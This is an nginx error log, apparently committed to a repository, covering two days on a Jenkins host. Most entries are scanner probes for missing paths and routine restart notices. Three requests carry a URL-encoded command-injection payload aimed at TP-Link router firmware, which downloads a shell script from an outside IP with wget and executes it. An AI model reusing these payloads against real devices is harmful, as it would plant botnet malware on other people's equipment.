+2024/04/20 01:41:51 [error] 21#21: *9430 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 02:37:57 [error] 21#21: *9436 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.30, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/20 02:42:53 [error] 21#21: *9437 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 03:23:15 [error] 21#21: *9440 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 87.236.176.202, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/20 03:36:08 [error] 21#21: *9449 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.62.156.17, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 03:37:21 [error] 21#21: *9454 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.156.23, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/20 03:37:34 [error] 21#21: *9455 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 80.94.92.60, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 03:38:31 [error] 21#21: *9456 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 64.62.156.15, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/20 03:39:10 [error] 21#21: *9457 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.156.19, server: jenkins.thanhtha.name.vn, request: "GET /geoserver/web/ HTTP/1.1", host: "61.14.234.55"
+2024/04/20 03:41:16 [error] 21#21: *9462 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 5.202.41.227, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 03:44:22 [error] 21#21: *9467 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 200.165.250.158, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 03:47:05 [error] 21#21: *9468 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.78.68.58, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 04:39:43 [error] 20#20: *9527 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.150.237, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 04:46:10 [error] 20#20: *9528 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 05:54:44 [error] 20#20: *9551 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 06:41:45 [error] 20#20: *9564 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.79.181.251, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 07:12:31 [error] 20#20: *9568 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 07:13:04 [error] 20#20: *9569 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.243.146.55, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 07:36:48 [error] 20#20: *9571 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 08:12:10 [error] 20#20: *9591 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 08:19:52 [error] 20#20: *9592 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 205.210.31.92, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/20 09:49:06 [error] 20#20: *9611 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.180.140.6, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 09:49:06 [error] 20#20: *9612 open() "/etc/nginx/html/wp-content/plugins/kingcomposer/readme.txt" failed (2: No such file or directory), client: 185.180.140.6, server: jenkins.thanhtha.name.vn, request: "GET /wp-content/plugins/kingcomposer/readme.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:16:43 [error] 20#20: *12393 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 10:26:58 [error] 21#21: *12397 open() "/etc/nginx/html/Kvsh/login/index_main.php" failed (2: No such file or directory), client: 67.217.48.178, server: jenkins.thanhtha.name.vn, request: "POST /Kvsh/login/index_main.php HTTP/1.1", host: "unique-li.club"
+2024/04/20 10:40:51 [error] 21#21: *12399 open() "/etc/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: jenkins.thanhtha.name.vn, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "61.14.234.55", referrer: "https://61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12402 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12403 open() "/etc/nginx/html/form.html" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /form.html HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12404 open() "/etc/nginx/html/upl.php" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /upl.php HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12406 "/etc/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /geoip/ HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12407 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12408 open() "/etc/nginx/html/1.php" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /1.php HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12409 open() "/etc/nginx/html/bundle.js" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /bundle.js HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12410 "/etc/nginx/html/files/index.html" is not found (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /files/ HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 21#21: *12411 open() "/etc/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /systembc/password.php HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 20#20: *12412 open() "/etc/nginx/html/password.php" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /password.php HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:48:23 [error] 20#20: *12413 open() "/etc/nginx/html/info.php" failed (2: No such file or directory), client: 152.42.186.244, server: jenkins.thanhtha.name.vn, request: "GET /info.php HTTP/1.1", host: "61.14.234.55"
+2024/04/20 10:56:31 [error] 20#20: *12414 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 11:07:55 [error] 20#20: *12416 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 101.128.67.200, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 11:19:49 [error] 20#20: *12417 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 11:45:48 [error] 20#20: *12421 open() "/etc/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: jenkins.thanhtha.name.vn, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "61.14.234.55", referrer: "https://61.14.234.55"
+2024/04/20 12:16:11 [error] 20#20: *12424 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.227.9.239, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 13:16:59 [error] 20#20: *12431 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 14:02:08 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/20 14:02:08 [notice] 21#21: gracefully shutting down
+2024/04/20 14:02:08 [notice] 20#20: gracefully shutting down
+2024/04/20 14:02:08 [notice] 21#21: exiting
+2024/04/20 14:02:08 [notice] 20#20: exiting
+2024/04/20 14:02:08 [notice] 21#21: exit
+2024/04/20 14:02:08 [notice] 20#20: exit
+2024/04/20 14:02:08 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/20 14:02:08 [notice] 1#1: worker process 20 exited with code 0
+2024/04/20 14:02:08 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/20 14:02:08 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/20 14:02:08 [notice] 1#1: worker process 21 exited with code 0
+2024/04/20 14:02:08 [notice] 1#1: exit
+2024/04/20 14:04:07 [notice] 1#1: using the "epoll" event method
+2024/04/20 14:04:07 [notice] 1#1: nginx/1.25.4
+2024/04/20 14:04:07 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/20 14:04:07 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/20 14:04:07 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/20 14:04:07 [notice] 1#1: start worker processes
+2024/04/20 14:04:07 [notice] 1#1: start worker process 19
+2024/04/20 14:04:07 [notice] 1#1: start worker process 20
+2024/04/20 14:04:21 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/20 14:04:21 [notice] 19#19: gracefully shutting down
+2024/04/20 14:04:21 [notice] 19#19: exiting
+2024/04/20 14:04:21 [notice] 19#19: exit
+2024/04/20 14:04:21 [notice] 20#20: gracefully shutting down
+2024/04/20 14:04:21 [notice] 20#20: exiting
+2024/04/20 14:04:21 [notice] 20#20: exit
+2024/04/20 14:04:21 [notice] 1#1: signal 17 (SIGCHLD) received from 19
+2024/04/20 14:04:21 [notice] 1#1: worker process 19 exited with code 0
+2024/04/20 14:04:21 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/20 14:04:21 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/20 14:04:21 [notice] 1#1: worker process 20 exited with code 0
+2024/04/20 14:04:21 [notice] 1#1: exit
+2024/04/20 14:04:39 [notice] 1#1: using the "epoll" event method
+2024/04/20 14:04:39 [notice] 1#1: nginx/1.25.4
+2024/04/20 14:04:39 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/20 14:04:39 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/20 14:04:39 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/20 14:04:39 [notice] 1#1: start worker processes
+2024/04/20 14:04:39 [notice] 1#1: start worker process 20
+2024/04/20 14:04:39 [notice] 1#1: start worker process 21
+2024/04/20 14:05:26 [error] 21#21: *5 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 14.241.230.141, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/20 14:05:26 [error] 21#21: *5 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 14.241.230.141, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "jenkins.thanhtha.name.vn", referrer: "http://jenkins.thanhtha.name.vn/"
+2024/04/20 14:05:46 [error] 20#20: *71 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 14:29:48 [error] 21#21: *1206 open() "/etc/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: jenkins.thanhtha.name.vn, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "61.14.234.55"
+2024/04/20 14:43:39 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/20 14:43:39 [notice] 20#20: gracefully shutting down
+2024/04/20 14:43:39 [notice] 20#20: exiting
+2024/04/20 14:43:39 [notice] 20#20: exit
+2024/04/20 14:43:39 [notice] 21#21: gracefully shutting down
+2024/04/20 14:43:39 [notice] 21#21: exiting
+2024/04/20 14:43:39 [notice] 21#21: exit
+2024/04/20 14:43:39 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/20 14:43:39 [notice] 1#1: worker process 20 exited with code 0
+2024/04/20 14:43:39 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/20 14:43:39 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/20 14:43:39 [notice] 1#1: worker process 21 exited with code 0
+2024/04/20 14:43:39 [notice] 1#1: exit
+2024/04/20 14:43:42 [notice] 1#1: using the "epoll" event method
+2024/04/20 14:43:42 [notice] 1#1: nginx/1.25.4
+2024/04/20 14:43:42 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/20 14:43:42 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/20 14:43:42 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/20 14:43:42 [notice] 1#1: start worker processes
+2024/04/20 14:43:42 [notice] 1#1: start worker process 20
+2024/04/20 14:43:42 [notice] 1#1: start worker process 21
+2024/04/20 14:44:11 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/20 14:44:11 [notice] 20#20: gracefully shutting down
+2024/04/20 14:44:11 [notice] 20#20: exiting
+2024/04/20 14:44:11 [notice] 21#21: gracefully shutting down
+2024/04/20 14:44:11 [notice] 21#21: exiting
+2024/04/20 14:44:11 [notice] 21#21: exit
+2024/04/20 14:44:11 [notice] 20#20: exit
+2024/04/20 14:44:11 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/20 14:44:11 [notice] 1#1: worker process 20 exited with code 0
+2024/04/20 14:44:11 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/20 14:44:11 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/20 14:44:11 [notice] 1#1: worker process 21 exited with code 0
+2024/04/20 14:44:11 [notice] 1#1: exit
+2024/04/20 14:44:28 [notice] 1#1: using the "epoll" event method
+2024/04/20 14:44:28 [notice] 1#1: nginx/1.25.4
+2024/04/20 14:44:28 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/20 14:44:28 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/20 14:44:28 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/20 14:44:28 [notice] 1#1: start worker processes
+2024/04/20 14:44:28 [notice] 1#1: start worker process 19
+2024/04/20 14:44:28 [notice] 1#1: start worker process 20
+2024/04/20 14:45:12 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/20 14:45:12 [notice] 19#19: gracefully shutting down
+2024/04/20 14:45:12 [notice] 20#20: gracefully shutting down
+2024/04/20 14:45:12 [notice] 19#19: exiting
+2024/04/20 14:45:12 [notice] 20#20: exiting
+2024/04/20 14:45:12 [notice] 19#19: exit
+2024/04/20 14:45:12 [notice] 20#20: exit
+2024/04/20 14:45:12 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/20 14:45:12 [notice] 1#1: worker process 20 exited with code 0
+2024/04/20 14:45:12 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/20 14:45:12 [notice] 1#1: signal 17 (SIGCHLD) received from 19
+2024/04/20 14:45:12 [notice] 1#1: worker process 19 exited with code 0
+2024/04/20 14:45:12 [notice] 1#1: exit
+2024/04/20 14:45:16 [notice] 1#1: using the "epoll" event method
+2024/04/20 14:45:16 [notice] 1#1: nginx/1.25.4
+2024/04/20 14:45:16 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/20 14:45:16 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/20 14:45:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/20 14:45:16 [notice] 1#1: start worker processes
+2024/04/20 14:45:16 [notice] 1#1: start worker process 21
+2024/04/20 14:45:16 [notice] 1#1: start worker process 22
+2024/04/20 14:45:54 [error] 21#21: *5 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 14.241.230.141, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/20 14:57:46 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/20 14:57:46 [notice] 22#22: gracefully shutting down
+2024/04/20 14:57:46 [notice] 22#22: exiting
+2024/04/20 14:57:46 [notice] 21#21: gracefully shutting down
+2024/04/20 14:57:46 [notice] 21#21: exiting
+2024/04/20 14:57:46 [notice] 22#22: exit
+2024/04/20 14:57:46 [notice] 21#21: exit
+2024/04/20 14:57:46 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2024/04/20 14:57:46 [notice] 1#1: worker process 22 exited with code 0
+2024/04/20 14:57:46 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/20 14:57:46 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/20 14:57:46 [notice] 1#1: worker process 21 exited with code 0
+2024/04/20 14:57:46 [notice] 1#1: exit
+2024/04/21 07:59:54 [notice] 1#1: using the "epoll" event method
+2024/04/21 07:59:54 [notice] 1#1: nginx/1.25.4
+2024/04/21 07:59:54 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/21 07:59:54 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/21 07:59:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/21 07:59:54 [notice] 1#1: start worker processes
+2024/04/21 07:59:54 [notice] 1#1: start worker process 20
+2024/04/21 07:59:54 [notice] 1#1: start worker process 21
+2024/04/21 08:01:48 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/21 08:01:48 [notice] 20#20: gracefully shutting down
+2024/04/21 08:01:48 [notice] 21#21: gracefully shutting down
+2024/04/21 08:01:48 [notice] 20#20: exiting
+2024/04/21 08:01:48 [notice] 21#21: exiting
+2024/04/21 08:01:48 [notice] 20#20: exit
+2024/04/21 08:01:48 [notice] 21#21: exit
+2024/04/21 08:01:49 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/21 08:01:49 [notice] 1#1: worker process 20 exited with code 0
+2024/04/21 08:01:49 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/21 08:01:49 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/21 08:01:49 [notice] 1#1: worker process 21 exited with code 0
+2024/04/21 08:01:49 [notice] 1#1: exit
+2024/04/21 08:01:57 [notice] 1#1: using the "epoll" event method
+2024/04/21 08:01:57 [notice] 1#1: nginx/1.25.4
+2024/04/21 08:01:57 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/21 08:01:57 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/21 08:01:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/21 08:01:57 [notice] 1#1: start worker processes
+2024/04/21 08:01:57 [notice] 1#1: start worker process 20
+2024/04/21 08:01:57 [notice] 1#1: start worker process 21
+2024/04/21 08:02:17 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/21 08:02:17 [notice] 20#20: gracefully shutting down
+2024/04/21 08:02:17 [notice] 20#20: exiting
+2024/04/21 08:02:17 [notice] 21#21: gracefully shutting down
+2024/04/21 08:02:17 [notice] 21#21: exiting
+2024/04/21 08:02:17 [notice] 21#21: exit
+2024/04/21 08:02:17 [notice] 20#20: exit
+2024/04/21 08:02:17 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/21 08:02:17 [notice] 1#1: worker process 21 exited with code 0
+2024/04/21 08:02:17 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/21 08:02:17 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/21 08:02:17 [notice] 1#1: worker process 20 exited with code 0
+2024/04/21 08:02:17 [notice] 1#1: exit
+2024/04/21 08:02:58 [notice] 1#1: using the "epoll" event method
+2024/04/21 08:02:58 [notice] 1#1: nginx/1.25.4
+2024/04/21 08:02:58 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/21 08:02:58 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/21 08:02:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/21 08:02:58 [notice] 1#1: start worker processes
+2024/04/21 08:02:58 [notice] 1#1: start worker process 21
+2024/04/21 08:02:58 [notice] 1#1: start worker process 22
+2024/04/21 08:03:12 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/21 08:03:12 [notice] 22#22: gracefully shutting down
+2024/04/21 08:03:12 [notice] 22#22: exiting
+2024/04/21 08:03:12 [notice] 21#21: gracefully shutting down
+2024/04/21 08:03:12 [notice] 21#21: exiting
+2024/04/21 08:03:12 [notice] 21#21: exit
+2024/04/21 08:03:12 [notice] 22#22: exit
+2024/04/21 08:03:12 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/21 08:03:12 [notice] 1#1: worker process 21 exited with code 0
+2024/04/21 08:03:12 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/21 08:03:12 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2024/04/21 08:03:12 [notice] 1#1: worker process 22 exited with code 0
+2024/04/21 08:03:12 [notice] 1#1: exit
+2024/04/21 08:44:32 [notice] 1#1: using the "epoll" event method
+2024/04/21 08:44:32 [notice] 1#1: nginx/1.25.5
+2024/04/21 08:44:32 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/21 08:44:32 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/21 08:44:32 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/21 08:44:32 [notice] 1#1: start worker processes
+2024/04/21 08:44:32 [notice] 1#1: start worker process 20
+2024/04/21 08:44:32 [notice] 1#1: start worker process 21
+2024/04/21 08:57:50 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/21 08:57:50 [notice] 21#21: gracefully shutting down
+2024/04/21 08:57:50 [notice] 21#21: exiting
+2024/04/21 08:57:50 [notice] 21#21: exit
+2024/04/21 08:57:50 [notice] 20#20: gracefully shutting down
+2024/04/21 08:57:50 [notice] 20#20: exiting
+2024/04/21 08:57:50 [notice] 20#20: exit
+2024/04/21 08:57:50 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/21 08:57:50 [notice] 1#1: worker process 21 exited with code 0
+2024/04/21 08:57:50 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/21 08:57:50 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/21 08:57:50 [notice] 1#1: worker process 20 exited with code 0
+2024/04/21 08:57:50 [notice] 1#1: exit
+2024/04/21 08:58:15 [notice] 1#1: using the "epoll" event method
+2024/04/21 08:58:15 [notice] 1#1: nginx/1.25.5
+2024/04/21 08:58:15 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/21 08:58:15 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/21 08:58:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/21 08:58:15 [notice] 1#1: start worker processes
+2024/04/21 08:58:15 [notice] 1#1: start worker process 20
+2024/04/21 08:58:15 [notice] 1#1: start worker process 21
+2024/04/21 08:59:36 [error] 20#20: *72 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 14.241.230.141, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "docker.thanhtha.name.vn"
+2024/04/21 08:59:36 [error] 20#20: *72 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 14.241.230.141, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "docker.thanhtha.name.vn", referrer: "http://docker.thanhtha.name.vn/"
